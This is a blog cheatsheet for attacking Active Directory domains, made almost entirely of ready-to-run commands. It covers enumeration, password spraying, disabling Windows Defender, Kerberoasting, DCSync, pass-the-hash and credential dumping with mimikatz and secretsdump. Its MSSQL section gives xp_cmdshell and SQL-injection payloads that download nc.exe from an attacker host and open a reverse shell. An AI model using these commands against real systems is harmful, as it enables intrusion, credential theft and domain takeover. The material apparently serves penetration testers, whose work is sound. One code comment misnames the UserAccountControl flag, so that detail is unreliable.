---
layout: post
title:  Attacking Active Directory Cheatsheet
description: Cheatsheet for Attacking Active Directory
date:   2024-11-02 09:00:00 +0300
image:  '/images/10000.jpg'
tags:   [Cheatsheets, Tools, Active-Directory, Active-Directory-Enumeration, SMB, Kerberoasting, AS-REP-Roasting, DCSync, ACLs, MSSQL, Credential-Dumping, Credential-Hunting]
---
<span style="font-size: smaller;">**Disclaimer**: This cheatsheet is regularly updated to ensure accuracy; however, due to updates and evolving tools, some commands may no longer work or may have alternative methods of running them. Please verify commands as needed and consult official documentation or additional resources if a command does not perform as expected.</span>

# Table of Contents

- [Identifying the Domain Controller](#identifying-the-domain-controller)
- [Uncredentialed Enumeration and Attacks](#uncredentialed-enumeration-and-attacks)
- [Domain Password Policy](#domain-password-policy)
- [Domain and Local User](#domain-and-local-user)
- [Domain and Local Group](#domain-and-local-group)
- [SMB Shares Credentialed](#smb-shares-credentialed)
- [RPC Credentialed](#rpc-credentialed)
- [GPP cpassword](#gpp-cpassword)
- [Password Spraying](#password-spraying)
- [Runas and RunasCs.exe](#runas-and-runascsexe)
- [Enable Running Scripts and Disable Windows Defender](#enable-running-scripts-and-disable-windows-defender)
- [BloodHound](#bloodhound)
- [PowerView.ps1](#powerviewps1)
- [Impacket PsExec, WmiExec and SMBExec](#impacket-psexec-wmiexec-and-smbexec)
- [Evil-WinRM](#evil-winrm)
- [xFreeRDP](#xfreerdph)
- [Kerberoasting](#kerberoasting)
- [AS-REP Roasting](#as-rep-roasting)
- [DCSync](#dcsync)
- [Remote Credential Dumping](#remote-credential-dumping)
- [Local Credential Dumping](#local-credential-dumping)
- [MSSQL Basics](#mssql-basics)
- [MSSQL Reverse Shell](#mssql-reverse-shell)
- [ACLs Abuse Attacks](#acls-abuse-attacks)

### Identifying the Domain Controller
```shell
# Using NetExec and CrackMapExec (Examine results for a host like DC01, for example)
nxc smb 172.16.150.0/24
crackmapexec smb 172.16.150.0/24

# Nmap Scan (Use -v verbose to see active ports before the scan is completed so we can start planning what we could do)
nmap -p- 172.16.150.10 -v
nmap -A -p- 172.16.150.10 -v
nmap -A -p- -T4 -Pn 172.16.150.10 -v
nmap -A -p- -T4 -Pn 172.16.150.0/24 -v

# Two Steps Nmap Scan (Identify active ports with first scan, run scripts on active ports with second scan)
nmap -p- --min-rate 10000 172.16.150.10
nmap -A -p21,22,25,53,69,80,111,135,139,389,445,636,1433,3268,3269,3389,5985,8000,8080,47001 172.16.150.10

# Nmap ARP Discovery
nmap -n -sn 172.16.150.0/24

# Nmap UDP SNMP
sudo nmap -sU -p161 172.16.150.10 -v
sudo nmap -sU -p161,162,10161,10162 172.16.150.10 -v

# Nmap through Proxychains
proxychains -q nmap -A -p- -T4 -Pn 172.16.150.10

# To find out which host is the Domain Controller, look for these typical Domain Controller ports in Nmap the results:
Port 53 - DNS
Port 88 - Kerberos
Port 135 - RPC
Port 389 - LDAP
Port 445 - SMB
Port 636 - LDAPS
Port 3268 - Global Catalog LDAP
Port 3269 - Global Catalog LDAPS

# Create an internal_ips.txt list with all the alive IPs that we find
cat internal_ips.txt

172.16.150.20
172.16.150.50
172.16.150.70
172.16.150.120
```
### Uncredentialed Enumeration and Attacks
```shell
# DNS Zone Transfer
dig @172.16.150.10 AXFR example.com

# LDAP Anonymous Session Dump
ldapsearch -x -H ldap://172.16.150.10 -b "dc=example,dc=com"

# No-PreAuth Kerberos without Username
impacket-GetNPUsers vorkharium.com/ -dc-ip 172.16.150.10

# SMB Null Session with smbclient
smbclient -L 172.16.150.10 -N
smbclient -N -L //172.16.150.10
smbclient --no-pass -L //172.16.150.10
smbclient //172.16.150.10/Public -N
smbclient -U '%' -N \\\\172.16.150.10\\Public

# SMB Null Session with other tools
smbmap -H 172.16.150.10 -P 445
nxc smb 172.16.150.10 --shares -u 'guest' -p ''
crackmapexec smb 172.16.150.10 -u '' -p '' --shares
impacket-smbclient vorkharium.com/'':''@172.16.150.10

# RPC Null Session
rpcclient 172.16.150.10 -N
rpcclient -U "" -N 172.16.150.10
rpcclient -U="" 172.16.150.10

# RPC Commands
querydispinfo
enumdomusers
enumdomgroups
queryuser johnwick

# Command to get users and put them in users_rpc.txt
rpcclient -U "" 172.16.150.10 -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > users_rpc.txt

# impacket-rpcdump
impacket-rpcdump -port 135 vorkharium.com/'':''@172.16.150.10

# enum4linux
enum4linux -U 172.16.150.10

```
### Domain Password Policy
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u 'Vivi' -p 'Thundaga2000' --pass-pol
crackmapexec smb 172.16.150.10 -u 'Tidus' -p 'ToZanarkand2001' --pass-pol

# enum4linux
enum4linux -U 172.16.150.10 # Without credentials
enum4linux -u john -p 'Password123!' -U 172.16.150.10

# CMD and PowerShell
net accounts
net user john /domain

# PowerShell (Some require AD Module to be installed)
Get-ADDefaultDomainPasswordPolicy
(Get-ADDomain).DefaultPasswordPolicy
Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object -Property Name, PasswordExpirationDate
```
### Domain and Local User
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --users
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --users

# With impacket-GetADUsers
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!'

# My custom way of creating a domain_users.txt list with one command
impacket-GetADUsers -all -dc-ip 172.16.150.10 vorkharium.com/john:'Password123!' | awk 'NR>3 {print $1}' >> domain_users.txt

# LDAP
ldapsearch -x -H ldap://172.16.150.10 -D "john@vorkharium.com" -w 'Password123!' -b "dc=vorkharium,dc=com" "(objectClass=user)" sAMAccountName

# RPC
rpcclient -U 'john%Password123!' 172.16.150.10 -c "enumdomusers"

# enum4linux
enum4linux -u john -p 'Password123!' 172.16.150.10

# PowerView.ps1
Import-Module .\PowerView.ps1
Get-NetUser

# PowerShell (AD Module)
Get-ADUser -Filter * -Property SamAccountName
Get-ADUser -Filter * -Server 172.16.150.10 -Property SamAccountName

```
### Domain and Local Group
```shell
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --groups
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --groups

# CMD and PowerShell
# Domain groups
net group /domain
net group "Domain Admins" /domain # Specifying a domain group

# Local groups
net localgroup
net localgroup Administrators

# Current User groups
whoami /groups

# PowerShell (Some require AD Module to be installed)
Get-ADGroup -Filter *
Get-ADGroup -Filter *
Get-ADGroupMember -Identity "Administrators"
Get-WmiObject -Class Win32_Group | Select-Object Name, Domain
Get-WmiObject -Class Win32_Group -ComputerName 172.16.150.10

# PowerShell Local Groups
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```
### SMB Shares Credentialed
```shell
# Enumeration
# NetExec and CrackMapExec
nxc smb 172.16.150.10 -u john -p 'Password123!' --shares
crackmapexec smb 172.16.150.10 -u john -p 'Password123!' --shares

# CMD and PowerShell
net view \\172.16.150.10
net share
net use
Get-SmbShare

# enum4linux
enum4linux -S 172.16.150.10

# Connection
smbclient //172.16.150.10/Public -U john
impacket-smbclient vorkharium.com/john:'Password123!'@172.16.150.10

# Enable Recursive
smb: \> recurse on
smb: \> prompt off
smb: \> ls
```
### RPC Credentialed
```shell
# With Password
rpcclient -U "username%password" 172.16.150.10

# Using hash
rpcclient //172.16.150.10 -U vorkharium.com/john%1a06b4248879e68a498d3bac51bf91c9 --pw-nt-hash

# All RPC Queries
srvinfo # Get server OS and domain info
enumdomusers # List all domain users
enumpriv # Show current user’s privileges
queryuser john # Get info on user "john"
getuserdompwinfo <RID> # Fetch domain password policy by user's RID
lookupnames john # Get SID for user "john"
createdomuser john # Add user "john" to the domain
deletedomuser john # Remove user "john" from the domain
enumdomains # List accessible domains
enumdomgroups # List all domain groups
querygroup <group-RID> # Get details on a group by RID
querydispinfo # Describe all domain users
netshareenum # List shared resources (user permission needed)
netshareenumall # List all shared resources (all access)
lsaenumsid # List all user SIDs on the system
```
### GPP cpassword
Check if we can find a file called Groups.xml inside SYSVOL folder through SMB Shares access. This file contains a "cpassword" field. To decrypt the hash in the cpassword field we can use the following command:
```shell
sudo apt install gpp-decrypt
gpp-decrypt F7HV9AXdOSpNAXTDhwZt0atMg6S/Q0TOnyGDYMIzL7o ​
# This will give us the credentials for the user the Groups.xml is related to
```
### Password Spraying
```shell
# kerbrute.py
git clone https://github.com/TarlogicSecurity/kerbrute.git
cd kerbrute

python3 kerbrute.py -users usernames.txt -passwords passwords.txt -dc-ip 172.16.150.10 -domain vorkharium.com

# NetExec
# Password Spraying
nxc smb 172.16.150.10 -u john -p passwords.txt
nxc smb 172.16.150.10 -u usernames.txt -p 'Password123!'
nxc smb internal_ips.txt -u usernames.txt -p passwords.txt --continue-on-success

# Hash Spraying
nxc smb 172.16.150.10 -u john -H NT_hashes.txt
nxc smb 172.16.150.10 -u usernames.txt -H 'NT_HASH'
nxc smb internal_ips.txt -u usernames.txt -H NT_hashes.txt --continue-on-success

# Local Authentication
nxc smb 172.16.150.10 -u john -p 'Password123!' --local-auth
nxc smb 172.16.150.10 -u domain_users.txt -p passwords_found.txt --local-auth

# RDP
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc rdp ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# WinRM
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc winrm ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# MSSQL
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success --local-auth

# We can also use CrackMapExec running almost the same commands replacing "nxc" for "crackmapexec". For example:
crackmapexec smb 172.16.150.10 -u Dovahkiin -p 'FusRoDah!'
```
### Local Credential Hunting
```shell
# PowerShell History
powershell -c "Get-History"
powershell -c "(Get-PSReadlineOption).HistorySavePath"
type C:\Users\john\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"  

# Display stored credentials
cmdkey /list

# Show hidden files inside current folder (Similar to "ls -al")
dir /a /q
dir /a /o /s

# Finding and Cracking KeePass .kdbx Files
# CMD
dir /s /b *.kdbx 
# PowerShell
Get-ChildItem -Recurse -Filter *.kdbx
# Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/usr/share/wordlists/rockyou.txt keepasshash

# Finding Files potentially containing Credentials
# .db and KeePass .kdbx
Get-ChildItem -Path C:\ -Include *.db, *.kdbx -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# .txt, .ini, .config, .php
Get-ChildItem -Path C:\ -Include *.txt, *.ini, *.config, *.php -Recurse -ErrorAction SilentlyContinue | Select-Object FullName

# More commands to search for credentials
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
findstr /si password *.config 
findstr /si pass/pwd *.ini
findstr /si password *.xml *.ini *.txt
findstr /spin "password" *.*

dir .s *pass* == *.config
dir /s *pass* == *cred* == *vnc* == *.config*  
```
### Runas and RunasCs.exe
```shell
# Native Runas
# Local - Changing to user "jane"
runas /user:jane cmd # Enter the password now when asked

# Domain - Changing to user "john"
runas /netonly /user:vorkharium.com\john cmd

# RunasCs.exe
# Using RunasCs.exe with pwnednewuser (pwnednewuser is a new user with admin rights we added before through an exploit)
./RunasCs.exe pwnednewuser 'password123!' "cmd /c type C:\Users\Administrator\Desktop\root.txt" --bypass-uac --logon-type '8' --force-profile
```
### Enable Running Scripts and Disable Windows Defender
```shell
# Enable Running Scripts on PowerShell (as Administrator)
Set-ExecutionPolicy RemoteSigned
Set-ExecutionPolicy Unrestricted
Get-ExecutionPolicy

# Disable Windows Defender on PowerShell (as Administrator)
Set-MpPreference -DisableRealtimeMonitoring $true
Get-MpPreference | Select-Object -Property DisableRealtimeMonitoring
```
### BloodHound
```shell
# BloodHound Collectors
# SharpHound v1.1.1 (Use version 1.1.1, otherwise SharpHound.exe results won't work and BloodHound will appear empty after loading them)
./SharpHound.exe --CollectionMethods All
.\SharpHound.exe -c All
.\SharpHound.exe --DisableCertVerification --DisableSigning --Domain vorkharium.com --ldapusername john --ldappassword 'Password123!'

# bloodhound-python
# Collect information with valid user "john"
bloodhound-python -d vorkharium.com -u john -p 'Password123!' -ns 172.16.150.10 -c all --dns-tcp

# BloodHound
# Starting BloodHound
sudo neo4j console
sudo bloodhound

# Clear database
# Load the .json files we collected with SharpHound.exe or bloodhound-python

# Important queries in BloodHound
- Find all Domain Admins
- Find Principals with DCSync Rights
- List all Kerberoastable Accounts
- Find AS-REP Roastable Users (DontReqPreAuth)
- Shortest Path to High Value Targets
```
### PowerView.ps1
```shell

# Get Domain User Information
Import-Module .\PowerView.ps1
$Cred = Get-Credential -UserName "vorkharium.com\john"
# It will ask for user "john" password here. Enter it manually
Get-DomainUser -Identity "john" -Credential $Cred -Verbose

# Detect Kerberoastable Account
$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
Get-DomainUser -SPN -Domain vorkharium.com -Credential $Cred | select SamAccountName

# Enumerate ACLs with NameToSid
$sid = Convert-NameToSid -Name john
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Detect Objects with ACLs (GenericAll) to perform DCSync
Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | 
Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }
# Or
Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | 
Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }

# Enumerate ACLs
$sid = Convert-NameToSid -Name john
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
For a complete and detailed list of all PowerView.ps1 commands check the following link:
https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters/powerview
### Impacket PsExec, WmiExec and SMBExec
```shell
# Using Password
# impacket-psexec with password
impacket-psexec Administrator:'Password123!'@172.16.150.10
impacket-psexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# impacket-wmiexec with password
impacket-wmiexec Administrator:'Password123!'@172.16.150.10
impacket-wmiexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# impacket-smbexec with password
impacket-smbexec Administrator:'Password123!'@172.16.150.10
impacket-smbexec vorkharium.com/Administrator:'Password123!'@172.16.150.10

# Using Hash (Pass-the-Hash)
# impacket-psexec with hash
impacket-psexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-psexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 

# impacket-wmiexec with hash
impacket-wmiexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-wmiexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9

# impacket-smbexec with hash
impacket-smbexec Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
impacket-smbexec vorkharium.com/Administrator@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 
```
### Evil-WinRM
```shell
# With Password
evil-winrm -i 172.16.150.10 -u Administrator -p 'Password123!'

# With Hash
evil-winrm -i 172.16.150.10 -u Administrator -H 1a06b4248879e68a498d3bac51bf91c9
```
### xFreeRDP
```shell
# Create "/home/kali/share" before using it - This folder will allow us to move files easily from inside the xfreerdp session

# Connection with share for file transfers
xfreerdp /u:Administrator /p:'Password123!' /v:172.16.150.10 /drive:share,/home/kali/share

# With extra parameters
xfreerdp /cert-ignore /auto-reconnect /h:1000 /w:1600 /v:172.16.150.10 /u:Administrator /p:'Password123!' /d:vorkharium.com /drive:share,/home/kali/share

# Using hash
xfreerdp /u:Administrator /pth:'1a06b4248879e68a498d3bac51bf91c9' /v:172.16.150.10 /drive:share,/home/kali/share
```
### Kerberoasting
```shell
# Kerberoasting from Kali using Impacket-GetUserSPNs
impacket-GetUserSPNs vorkharium.com/SVC_TGS:'Password123!' -dc-ip 172.16.150.10 -request

impacket-GetUserSPNs -dc-ip 172.16.150.10 vorkharium.com/john -request-user jane

# Kerberoasting from Windows Host using Rubeus.exe
./Rubeus.exe kerberoast /domain:vorkharium.com /user:jane /creduser:vorkharium.com\john /credpassword:'Password123!' /nowrap

# Cracking the hash
# With Hashcat
hashcat -m 13100 jane_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt

# With Johntheripper
sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
sudo john jane_hash.txt --show
```
### AS-REP Roasting
```shell
# AS-REP Roasting without password
impacket-GetNPUsers vorkharium.com/john -dc-ip 172.16.150.10 -request -no-pass

# AS-REP Roasting with password
impacket-GetNPUsers vorkharium.com/john:'Password123!' -dc-ip 172.16.150.10 -request -no-pass

# Cracking the hash
# With Hashcat
hashcat -m 18200 -a 0 jane_hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 18200 -a 0 -o cracked_jane_hash.txt jane_hash.txt /usr/share/wordlists/rockyou.txt

# With Johntheripper
sudo john --wordlist=/usr/share/wordlists/rockyou.txt jane_hash.txt
sudo john jane_hash.txt --show
```
### DCSync
```shell
# To be able to DCSync, the user needs to have these 3 permissions:
DS-Replication-Get-Changes
Replicating Directory Changes All
Replicating Directory Changes In Filtered Set

# Enumerating DCSync user permissions with PowerView.ps1
Import-Module .\PowerView.ps1
Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
# Or
Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

# Granting DCSync rights to any user using the Domain Admin user john and PowerView.ps1
$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=vorkharium,DC=com" -PrincipalIdentity newlyoverpowereduser -Rights DCSync -Verbose
# Check if the user successfully got DCSync rights
Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | ?{$_.IdentityReference -match "newlyoverpowereduser"}
# Or
Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | ?{$_.IdentityReference -match "newlyoverpowereduser"}

# Remote DCSync
# With password
impacket-secretsdump -outputfile dcsync.txt vorkharium.com/john:'Password123!'@172.16.150.10

# With hash
impacket-secretsdump -outputfile dcsync.txt -hashes :1a06b4248879e68a498d3bac51bf91c9 vorkharium.com/john@172.16.150.10

# Pass-the-Ticket
impacket-getTGT -dc-ip 172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9 'vorkharium.com/john@172.16.150.10'
export KRB5CCNAME='john.ccache'
impacket-secretsdump -k -outputfile dcsync.txt "vorkharium.com/john:'Password123!'@172.16.150.10"
```
### Remote Credential Dumping
```shell
# Using Impacket
# With password
impacket-secretsdump vorkharium.com/john:'Password123!'@172.16.150.10
# Using hash
impacket-secretsdump Administrator:@172.16.150.10 -hashes :1a06b4248879e68a498d3bac51bf91c9

# Example with -just-dc-user
impacket-secretsdump -just-dc-user jane vorkharium.com/john:"Password123!"@172.16.150.10

# Example with -dc-ip
impacket-secretsdump -dc-ip 172.16.150.10 'vorkharium.com/john:"Password123!"@172.16.150.10'

# With NetExec
# SAM
nxc smb 172.16.150.20 -u john -p 'Password123!' --sam

# LSA
nxc smb 172.16.150.20 -u john -p 'Password123!' --lsa

# NTDS.DIT RPC
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds

# NTDS.DIT VSS
nxc smb 172.16.150.20 -u john -p 'Password123!' --ntds vss

# LSASS
nxc smb 172.16.150.20 -u john -p 'Password123!' -M lsassy
nxc smb 172.16.150.20 -u john -p 'Password123!' -M mimikatz
nxc smb 172.16.150.20 -u john -p 'Password123!' -M nanodump
nxc smb 172.16.150.20 -u john -p 'Password123!' -M procdump

# LAPS Password
nxc ldap 172.16.150.20 -u john -p 'Password123!' -M laps -o computer=172.16.150.120
```
### Local Credential Dumping
```shell
# Mimikatz.exe
# Important Note: mimikatz.exe wont work from the evil-winrm console. Use nc to get shell instead
# Run mimikatz.exe as administrator

# On the mimikatz.exe console
privilege::debug
sekurlsa::logonpasswords # Hashes and plaintext passwords

# More mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords # Hashes and plaintext passwords
lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch

# One-liners
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"

# SAM and NTDS.DIT Dump
# reg.exe
reg save hklm\sam 'C:\Windows\Temp\sam'
reg save hklm\system 'C:\Windows\Temp\system'
reg save hklm\security 'C:\Windows\Temp\security'

# Transfer the SAM, SYSTEM and SECURITY files from Windows to Kali and to dump them locally

# Example of copying NTDS.DIT with Copy-FileSeBackupPrivilege
Copy-FileSeBackupPrivilege V:\Windows\NTDS\NTDS.DIT C:\Users\john\Desktop\NTDS.DIT
# Find a way to get NTDS.DIT and transfer it to Kali for local dump

# impacket-secretsdump
# With Security
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local

# With NTDS.DIT
impacket-secretsdump -system SYSTEM -sam SAM -ntds NTDS.DIT local

# Without SECURITY and without NTDS.DIT (Still able to dump something interesting)
impacket-secretsdump -sam SAM -system SYSTEM local

# samdump2
samdump2 SYSTEM SAM

# Note: Pay attention to case sensitive, upper and lower case. Try both tools always, one might fail
```
### MSSQL Basics
```shell
# Enumerating MSSQL
nxc mssql ips_internal.txt -u john -p 'Password123!' --continue-on-success
nxc mssql ips_internal.txt -u john -H 1a06b4248879e68a498d3bac51bf91c9 --continue-on-success

# Credentialed Login
impacket-mssqlclient john:'Password123!'@172.16.150.10 -windows-auth

# MSSQL queries
# Show current username
SELECT USER_NAME(); 
SELECT CURRENT_USER; 

# Show server version
SELECT @@VERSION;

# Get server name 
SELECT @@SERVERNAME; 

# Show list of databases ("master." is optional) 
SELECT name FROM master.sys.databases; 
EXEC sp_databases; 

# Show only user-created databases (exclude built-in databases)
SELECT name FROM master.sys.databases WHERE name NOT IN ('master', 'tempdb', 'model', 'msdb'); 

# Use a specific database
USE master; 

# Get table names from a specific database
SELECT table_name FROM somedatabase.information_schema.tables; 

# Get column names from a specific table
SELECT column_name FROM somedatabase.information_schema.columns WHERE table_name = 'sometable'; 

# Get credentials for 'sa' login user
SELECT name, master.sys.fn_varbintohexstr(password_hash) FROM master.sys.sql_logins; 

# Get credentials from 'vorkharium' database using 'dbo' table schema
SELECT * from vorkharium.dbo.users; 
```
### MSSQL Reverse Shell
```shell
# Getting Reverse Shell using nc.exe
# Start python3 http.server at port 8080 in Kali hosting nc.exe
python3 -m http.server 8080
# Start nc listener at port 443 in Kali
sudo nc -lvnp 443
# Getting Reverse Shell using MSSQL
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXECUTE xp_cmdshell "curl http://192.168.45.200:8080/nc.exe -o C:\\Users\\Public\\nc.exe";
EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 192.168.45.200 443 -e powershell.exe";

# Getting Reverse Shell using NetExec and CrackMapExec
# Start nc listener at port 443 in Kali
sudo nc -lvnp 443
# Getting a reverse shell
nxc mssql 172.16.150.10 -d vorkharium.com -u john -p Password123 -x "Enter revshells.com PowerShell#3 (Base64) Reverse Shell here"
crackmapexec mssql 172.16.150.10 -d vorkharium.com -u john -p Password123 -x "Enter revshells.com PowerShell#3 (Base64) Reverse Shell here"

# Using MSSQL Injection through vulnerable website
# Go to /login.aspx
http://vulnerablewebsite.com/login.aspx

# Start python3 server where nc.exe is hosted
python3 -m http.server 8080

# Start nc listener
nc -lvnp 443

# Exploit MSSQL Injection to get a shell in our nc listener port 4444
' EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; -- //
' EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
' EXECUTE xp_cmdshell "curl http://192.168.45.200:8080/nc.exe -o C:\\Users\\Public\\nc.exe"; -- //
' EXECUTE xp_cmdshell "C:\\Users\\Public\\nc.exe -nv 192.168.45.200 443 -e powershell.exe"; -- //
```
### ACLs Abuse Attacks
Note: We can enumerate ACLs using BloodHound too. But using PowerView.ps1 can give us some results that wouldn't show up on BloodHound otherwise.
```shell
# Enumerating ACLs with PowerView.ps1
# ACLs Enumeration with NameToSid
$sid = Convert-NameToSid -Name john
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# Detect Objects with ACLs (GenericAll) - Replace GenericAll for any other right, like WriteDacl
Get-ObjectAcl -DistinguishedName "dc=vorkharium,dc=com" -ResolveGUIDs | 
Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }
# Or
Get-DomainObjectAcl -TargetIdentity "dc=vorkharium,dc=com" -ResolveGUIDs | 
Where {	$_.ObjectType -match 'replication-get' -or $_.ActiveDirectoryRights -match 'GenericAll' }

# GenericAll on User to Change Password, Kerberoast and AS-REP Roast
# 1. Change the vulnerable user password using:

net user john NotPassword123 /domain

# 2. Kerberoast the vulnerable user after assigning an SPN

$Pass = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('vorkharium.com\john, $Pass')
Set-DomainObject -Credential $Cred -Identity targetusername -Set @{serviceprincipalname="nonexistant/fake"}
.\Rubeus.exe kerberoast /user:targetusername /nowrap
Set-DomainObject -Credential $Cred -Identity targetusername -Clear serviceprincipalname -Verbose

# 3. AS-REP Roast the vulnerable user after disabling pre-authentication for the vulnerable user
Set-DomainObject -Identity targetusername -XOR @{UserAccountControl=4194304}
# 4194304 sets the PASSWD_NOTREQD flag, allowing the account to operate without a required password
```
More ACLs Abuse Attacks on https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse